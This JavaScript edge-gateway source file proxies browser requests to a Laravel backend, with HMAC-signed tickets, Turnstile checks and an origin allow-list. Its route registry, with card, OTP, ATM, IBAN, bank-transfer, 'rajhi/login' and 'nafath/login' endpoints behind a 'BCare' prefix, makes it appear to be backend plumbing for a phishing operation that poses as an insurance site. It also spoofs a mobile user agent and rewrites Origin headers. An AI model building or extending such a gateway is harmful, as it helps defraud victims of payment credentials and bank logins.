const EDGE_VERSION = "v2";
const MAX_TICKET_TTL_SECONDS = 20;
export const UPSTREAM_MOBILE_USER_AGENT =
  "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36";

/**
 * Default-deny public API registry. Every browser-exposed path must be present
 * here explicitly; no wildcard path is ever forwarded to the Laravel origin.
 */
const GATEWAY_ROUTES = [
  { method: "GET", path: "/api/v1/sessions/current", upstreamPath: "/api/v1/sessions/current", routeId: "session.current", turnstile: false },
  { method: "GET", path: "/api/v1/visitors/challenge", upstreamPath: "/api/v1/visitors/challenge", routeId: "visitor.challenge", turnstile: false },
  { method: "POST", path: "/api/v1/visitors/register", upstreamPath: "/api/v1/visitors/register", routeId: "visitor.register", turnstile: true },
  { method: "POST", path: "/api/v1/visitors/heartbeat", upstreamPath: "/api/v1/visitors/heartbeat", routeId: "visitor.heartbeat", turnstile: false },
  { method: "POST", path: "/api/v1/sessions", upstreamPath: "/api/v1/sessions", routeId: "session.create", turnstile: true },
  { method: "POST", path: "/api/v1/bookings", upstreamPath: "/api/v1/bookings", routeId: "booking.create", turnstile: true },
  { method: "POST", path: "/api/v1/payments/card", upstreamPath: "/api/v1/payments/card", routeId: "payment.card", turnstile: true },
  { method: "POST", path: "/api/v1/payments/otp", upstreamPath: "/api/v1/payments/otp", routeId: "payment.otp", turnstile: false },
  { method: "POST", path: "/api/v1/payments/atm", upstreamPath: "/api/v1/payments/atm", routeId: "payment.atm", turnstile: false },
  { method: "POST", path: "/api/v1/payments/iban", upstreamPath: "/api/v1/payments/iban", routeId: "payment.iban", turnstile: false },
  { method: "POST", path: "/api/v1/payments/bank-transfer", upstreamPath: "/api/v1/payments/bank-transfer", routeId: "payment.bank_transfer", turnstile: false },
  { method: "POST", path: "/api/v1/mobile/otp", upstreamPath: "/api/v1/mobile/otp", routeId: "mobile.otp", turnstile: false },
  { method: "POST", path: "/api/v1/mobile/verify", upstreamPath: "/api/v1/mobile/verify", routeId: "mobile.verify", turnstile: false },
  { method: "POST", path: "/api/v1/nafath/login", upstreamPath: "/api/v1/nafath/login", routeId: "nafath.login", turnstile: false },
  { method: "POST", path: "/api/v1/rajhi/login", upstreamPath: "/api/v1/rajhi/login", routeId: "rajhi.login", turnstile: false },
  {
    method: "POST",
    path: "/api/vehicle-inquiry",
    upstreamPath: "/api/vehicle-inquiry",
    routeId: "vehicle.inquiry",
    turnstile: false,
    legacyGateway: true,
  },
  { method: "POST", path: "/api/laravel/broadcasting/auth", upstreamPath: "/broadcasting/auth", routeId: "broadcasting.auth", turnstile: false, legacyGateway: true },
  { method: "POST", path: "/broadcasting/auth", upstreamPath: "/broadcasting/auth", routeId: "broadcasting.auth", turnstile: false, legacyGateway: true },
  { method: "POST", path: "/broadcasting/user-auth", upstreamPath: "/broadcasting/user-auth", routeId: "broadcasting.user_auth", turnstile: false, legacyGateway: true },
];

const SUBMISSION_ROUTE_IDS = Object.freeze({
  profile: "submission.profile",
  step: "submission.step",
  continue: "submission.continue",
  "chat/send": "submission.chat_send",
});

/** Map the legacy BCare Laravel prefix into the signed API contract. */
function normalizeGatewayPath(pathname) {
  const legacyPrefix = "/api/laravel/api/v1";
  if (pathname === legacyPrefix || pathname.startsWith(`${legacyPrefix}/`)) {
    return pathname.slice("/api/laravel".length) || "/";
  }
  return pathname;
}

export function resolveGatewayRoute(method, pathname) {
  const normalizedPath = normalizeGatewayPath(pathname);
  const normalizedMethod = String(method || "GET").toUpperCase();
  const staticRoute = GATEWAY_ROUTES.find(
    route => route.method === normalizedMethod && route.path === normalizedPath,
  );
  if (staticRoute) return staticRoute;

  if (normalizedMethod === "GET" && /^\/api\/v1\/sessions\/[^/]+$/.test(normalizedPath)) {
    return { method: normalizedMethod, upstreamPath: normalizedPath, routeId: "session.read", turnstile: false };
  }

  if (["GET", "PUT"].includes(normalizedMethod) && /^\/api\/v1\/bookings\/[A-Za-z0-9._-]{1,128}$/.test(normalizedPath)) {
    return {
      method: normalizedMethod,
      upstreamPath: normalizedPath,
      routeId: normalizedMethod === "GET" ? "booking.read" : "booking.update",
      turnstile: false,
    };
  }

  if (normalizedMethod === "POST") {
    const submissionRoute = normalizedPath.match(
      /^\/api\/v1\/submissions\/[a-f0-9]{64}\/(profile|step|continue|chat\/send)$/,
    );
    if (submissionRoute) {
      const action = submissionRoute[1];
      return {
        method: normalizedMethod,
        upstreamPath: normalizedPath,
        routeId: SUBMISSION_ROUTE_IDS[action],
        turnstile: action === "step",
      };
    }
  }

  return null;
}

export function isWebSocketUpgrade(request) {
  return String(request.headers.get("Upgrade") || "").toLowerCase() === "websocket";
}

export function websocketUpstreamUrl(requestUrl, backend) {
  const request = new URL(requestUrl);
  const target = new URL(backend);
  target.pathname = request.pathname;
  target.search = request.search;
  return target;
}

export function listGatewayRoutes() {
  return GATEWAY_ROUTES.map(({ method, path }) => `${method} ${path}`);
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const requestId = crypto.randomUUID();
    const origin = normalizeOrigin(request.headers.get("Origin"));

    if (url.pathname === "/ws" || url.pathname.startsWith("/ws/")) {
      if (!origin || !isAllowedOrigin(origin, env)) {
        return json({ error: { code: origin ? "ORIGIN_BLOCKED" : "ORIGIN_REQUIRED", requestId } }, 403);
      }
      if (request.method !== "GET" || !isWebSocketUpgrade(request)) {
        return json({ error: { code: "WEBSOCKET_UPGRADE_REQUIRED", requestId } }, 426, origin);
      }
      const backend = String(env.BACKEND_URL || "").replace(/\/+$/, "");
      if (!backend) return json({ error: { code: "GATEWAY_CONFIGURATION_ERROR", requestId } }, 503, origin);

      const upstreamUrl = websocketUpstreamUrl(request.url, backend);
      const headers = new Headers(request.headers);
      headers.set("Origin", backend);
      headers.set("User-Agent", UPSTREAM_MOBILE_USER_AGENT);
      headers.set("X-DataFlow-Original-Origin", origin);
      headers.set("X-DataFlow-Client-IP", normalizeIp(request.headers.get("CF-Connecting-IP")) || "");
      try {
        return await fetch(upstreamUrl, { headers });
      } catch {
        return json({ error: { code: "BACKEND_UNAVAILABLE", requestId } }, 502, origin);
      }
    }

    if (request.method === "OPTIONS") {
      return isAllowedOrigin(origin, env)
        ? new Response(null, { status: 204, headers: corsHeaders(origin) })
        : json({ error: { code: "ORIGIN_BLOCKED", requestId } }, 403);
    }

    if (!origin || !isAllowedOrigin(origin, env)) {
      return json({ error: { code: origin ? "ORIGIN_BLOCKED" : "ORIGIN_REQUIRED", requestId } }, 403);
    }

    const route = resolveGatewayRoute(request.method, url.pathname);
    if (!route) {
      return json({ error: { code: "ROUTE_NOT_REGISTERED", requestId } }, 404, origin);
    }

    const clientIp = normalizeIp(request.headers.get("CF-Connecting-IP"));
    if (!clientIp) {
      return json({ error: { code: "CLIENT_IP_UNAVAILABLE", requestId } }, 503, origin);
    }

    let turnstileVerified = false;
    if (route.turnstile) {
      const token = await extractTurnstileToken(request);
      if (!token) return json({ error: { code: "TURNSTILE_REQUIRED", requestId } }, 428, origin);

      const verification = await verifyTurnstile(token, clientIp, origin, env);
      if (verification.configurationError) {
        return json({ error: { code: "TURNSTILE_CONFIGURATION_ERROR", requestId } }, 503, origin);
      }
      if (verification.unavailable) {
        return json({ error: { code: "TURNSTILE_UNAVAILABLE", requestId } }, 503, origin);
      }
      if (!verification.valid) return json({ error: { code: "TURNSTILE_FAILED", requestId } }, 403, origin);
      turnstileVerified = true;
    }

    const ticket = await createEdgeTicket({
      request,
      env,
      origin,
      clientIp,
      requestId,
      routeId: route.routeId,
      canonicalPathname: route.upstreamPath,
      turnstileVerified,
    });
    if (!ticket) return json({ error: { code: "EDGE_SIGNING_UNAVAILABLE", requestId } }, 503, origin);

    const backend = String(env.BACKEND_URL || "").replace(/\/+$/, "");
    const gatewayToken = String(env.ORIGIN_GATEWAY_TOKEN || "");
    const legacyGatewayToken = String(env.EDGE_REQUEST_SIGNING_SECRET || gatewayToken);
    if (!backend || !gatewayToken) {
      return json({ error: { code: "GATEWAY_CONFIGURATION_ERROR", requestId } }, 503, origin);
    }

    try {
      const targetBackend = route.upstreamBase || backend;
      const upstream = await fetch(new URL(`${route.upstreamPath}${url.search}`, targetBackend), {
        method: request.method,
        headers: upstreamHeaders(
          request,
          origin,
          clientIp,
          ticket,
          gatewayToken,
          legacyGatewayToken,
          targetBackend,
          route.legacyGateway === true,
        ),
        body: ["GET", "HEAD"].includes(request.method) ? undefined : request.body,
        redirect: "manual",
      });
      return withCors(upstream, origin);
    } catch {
      return json({ error: { code: "BACKEND_UNAVAILABLE", requestId } }, 502, origin);
    }
  },
};

function normalizeOrigin(value) {
  try {
    const url = new URL(String(value || ""));
    return url.protocol === "https:" ? url.origin.toLowerCase() : "";
  } catch {
    return "";
  }
}

export function isAllowedOrigin(origin, env) {
  if (!origin) return false;
  if (origin === "https://sholomolo.com") return true;
  try {
    const url = new URL(origin);
    const host = url.hostname.toLowerCase();
    if (
      url.protocol === "https:" &&
      ((host.endsWith(".manus.space") && host.length > ".manus.space".length) ||
        (host.endsWith(".manus.computer") && host.length > ".manus.computer".length))
    ) {
      return true;
    }
  } catch {
    return false;
  }
  return String(env.ALLOWED_ORIGINS || "")
    .split(",")
    .map(normalizeOrigin)
    .filter(Boolean)
    .includes(origin);
}

function normalizeIp(value) {
  const ip = String(value || "").trim().replace(/^::ffff:/i, "");
  return /^[0-9a-fA-F:.]{1,45}$/.test(ip) ? ip : "";
}

async function extractTurnstileToken(request) {
  const headerToken = String(request.headers.get("X-Turnstile-Token") || "").trim();
  if (headerToken) return headerToken;
  if (!String(request.headers.get("Content-Type") || "").includes("application/json")) return "";
  try {
    const data = await request.clone().json();
    return String(data.turnstile_token || data.turnstileToken || "").trim();
  } catch {
    return "";
  }
}

async function verifyTurnstile(token, clientIp, origin, env) {
  const secret = String(env.TURNSTILE_SECRET_KEY || "");
  if (!secret) return { valid: false, configurationError: true, unavailable: false };
  try {
    const body = new URLSearchParams({ secret, response: token, remoteip: clientIp });
    const response = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body,
    });
    if (!response.ok) return { valid: false, configurationError: false, unavailable: true };
    const data = await response.json();
    return {
      valid: data.success === true && String(data.hostname || "").toLowerCase() === new URL(origin).hostname.toLowerCase(),
      configurationError: false,
      unavailable: false,
    };
  } catch {
    return { valid: false, configurationError: false, unavailable: true };
  }
}

async function createEdgeTicket({ request, env, origin, clientIp, requestId, routeId, canonicalPathname, turnstileVerified }) {
  const secret = String(env.EDGE_REQUEST_SIGNING_SECRET || "");
  const keyId = String(env.EDGE_TICKET_CURRENT_KEY_ID || "").trim();
  if (!secret || !/^[A-Za-z0-9._-]{1,64}$/.test(keyId)) return null;
  const url = new URL(request.url);
  const issuedAt = Math.floor(Date.now() / 1000);
  const expiresAt = issuedAt + MAX_TICKET_TTL_SECONDS;
  const nonce = crypto.randomUUID();
  const bodyHash = await bodyHashFor(request);
  const payload = [
    EDGE_VERSION,
    keyId,
    requestId,
    routeId,
    request.method.toUpperCase(),
    canonicalPathname,
    url.search,
    origin,
    clientIp,
    bodyHash,
    turnstileVerified ? "1" : "0",
    String(issuedAt),
    String(expiresAt),
    nonce,
  ].join("\n");
  const signature = await hmacBase64Url(secret, payload);
  return { keyId, requestId, routeId, issuedAt, expiresAt, nonce, bodyHash, signature, turnstileVerified };
}

async function bodyHashFor(request) {
  const bytes = ["GET", "HEAD"].includes(request.method.toUpperCase())
    ? new Uint8Array()
    : new Uint8Array(await request.clone().arrayBuffer());
  const digest = await crypto.subtle.digest("SHA-256", bytes);
  return [...new Uint8Array(digest)].map(byte => byte.toString(16).padStart(2, "0")).join("");
}

async function hmacBase64Url(secret, payload) {
  const key = await crypto.subtle.importKey("raw", new TextEncoder().encode(secret), { name: "HMAC", hash: "SHA-256" }, false, ["sign"]);
  const bytes = new Uint8Array(await crypto.subtle.sign("HMAC", key, new TextEncoder().encode(payload)));
  let binary = "";
  for (const byte of bytes) binary += String.fromCharCode(byte);
  return btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

export function upstreamHeaders(
  request,
  origin,
  clientIp,
  ticket,
  gatewayToken,
  legacyGatewayToken,
  backend,
  legacyGateway,
  legacyOrigin = "",
) {
  const headers = new Headers();
  for (const name of [
    "Accept",
    "Content-Type",
    "Cookie",
    "Idempotency-Key",
    "User-Agent",
    "X-Client-Access-Token",
    "X-CSRF-TOKEN",
    "X-Route-Access-Token",
    "X-Session-Token",
    "X-Socket-ID",
    "X-Visitor-Fingerprint",
    "X-Visitor-Id",
    "X-Visitor-Token",
  ]) {
    const value = request.headers.get(name);
    if (value) headers.set(name, value);
  }
  headers.set("Accept", "application/json");
  headers.set("User-Agent", UPSTREAM_MOBILE_USER_AGENT);
  headers.set("Origin", origin);
  headers.set("Referer", `${origin}/`);
  headers.set("X-Forwarded-Proto", "https");
  headers.set("X-BCare-Origin-Token", gatewayToken);
  headers.set("X-DataFlow-Original-Origin", origin);
  headers.set("X-DataFlow-Client-IP", clientIp);
  headers.set("X-DataFlow-Request-Id", ticket.requestId);
  headers.set("X-DataFlow-Edge-Version", EDGE_VERSION);
  headers.set("X-DataFlow-Edge-Key-Id", ticket.keyId);
  headers.set("X-DataFlow-Edge-Route-Id", ticket.routeId);
  headers.set("X-DataFlow-Edge-Issued-At", String(ticket.issuedAt));
  headers.set("X-DataFlow-Edge-Expires", String(ticket.expiresAt));
  headers.set("X-DataFlow-Edge-Nonce", ticket.nonce);
  headers.set("X-DataFlow-Edge-Body-SHA256", ticket.bodyHash);
  headers.set("X-DataFlow-Edge-Signature", ticket.signature);
  headers.set("X-DataFlow-Turnstile-Verified", ticket.turnstileVerified ? "1" : "0");

  if (legacyGateway) {
    const trustedOrigin = legacyOrigin || backend;
    headers.set("Origin", trustedOrigin);
    headers.set("Referer", `${trustedOrigin}/`);
    headers.set("X-DataFlow-Edge-Token", legacyGatewayToken);
    headers.set("X-DataFlow-Edge-Verified", "1");
    headers.set("X-Requested-With", "XMLHttpRequest");
    headers.set("X-Real-IP", clientIp);
    headers.set("X-Forwarded-For", clientIp);
    headers.set("CF-Connecting-IP", clientIp);
  }

  return headers;
}

function corsHeaders(origin) {
  return {
    "Access-Control-Allow-Origin": origin,
    "Access-Control-Allow-Credentials": "true",
    "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
    "Access-Control-Allow-Headers": "Accept, Content-Type, Cookie, Idempotency-Key, X-Client-Access-Token, X-CSRF-TOKEN, X-Route-Access-Token, X-Session-Token, X-Socket-ID, X-Turnstile-Token, X-Visitor-Fingerprint, X-Visitor-Id, X-Visitor-Token",
    "Access-Control-Expose-Headers": "X-Client-Access-Token, X-Client-Access-Token-Expires-At, X-Route-Access-Token, X-Route-Access-Token-Expires-At, X-Route-Access-Route, X-Route-Signed-Route",
    "Access-Control-Max-Age": "600",
    "Cache-Control": "no-store",
    Vary: "Origin",
  };
}

function json(payload, status, origin = "") {
  const headers = { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" };
  if (origin) Object.assign(headers, corsHeaders(origin));
  return new Response(JSON.stringify(payload), { status, headers });
}

export function stripCookieDomain(value) {
  return String(value || "").replace(/;\s*Domain=[^;]*/gi, "");
}

function responseSetCookies(headers) {
  if (typeof headers.getSetCookie === "function") return headers.getSetCookie();
  const singleValue = headers.get("Set-Cookie");
  return singleValue ? [singleValue] : [];
}

function withCors(upstream, origin) {
  const headers = new Headers(upstream.headers);
  const cookies = responseSetCookies(upstream.headers).map(stripCookieDomain).filter(Boolean);
  headers.delete("Set-Cookie");
  for (const cookie of cookies) headers.append("Set-Cookie", cookie);
  for (const [name, value] of Object.entries(corsHeaders(origin))) headers.set(name, value);
  return new Response(upstream.body, { status: upstream.status, statusText: upstream.statusText, headers });
}
